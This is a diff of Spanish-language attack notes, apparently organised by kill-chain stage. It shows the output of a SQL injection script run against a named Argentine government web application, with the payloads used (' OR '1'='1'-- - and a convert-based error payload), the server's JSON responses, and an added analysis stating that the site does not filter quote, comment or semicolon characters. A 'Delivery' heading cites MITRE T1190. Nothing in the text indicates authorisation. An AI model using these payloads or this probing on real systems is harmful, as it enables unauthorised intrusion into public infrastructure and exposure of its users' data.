@@ -597,7 +597,7 @@ mucho tiempo...
                             test_sql_injection(target_url, sql_payloads) 
                     
       ```
-      respuesta:
+  - respuesta:
       ```text
                     [+] Testing SQL Injection on: https://siper.vialidad.gob.ar/go/app-index-x.php
                     [!] Possible SQLi with payload: ' OR '1'='1'-- -
@@ -616,7 +616,11 @@ mucho tiempo...
                     Response: {"0":"'and1=convert(int,(selectuser))--","res":0,"msg":"Error[363] Ten\u00e9s tu contrase\u00f1a vencida."}
                        
       ```               
-
+  - analisis:
+        - Todos los payloads fueron aceptados por el sistema sin errores de sintaxis SQL 
+        - El sistema no bloquea caracteres especiales como ', --, #, /*, ; 
+        - La aplicación responde consistentemente con el mismo formato JSON para todos los payloads
+        - El código de error 363 se mantiene en todas las respuestas, indicando un comportamiento predecible
 
 ## Delivery
 - T1190 – Exploit Public-Facing Application
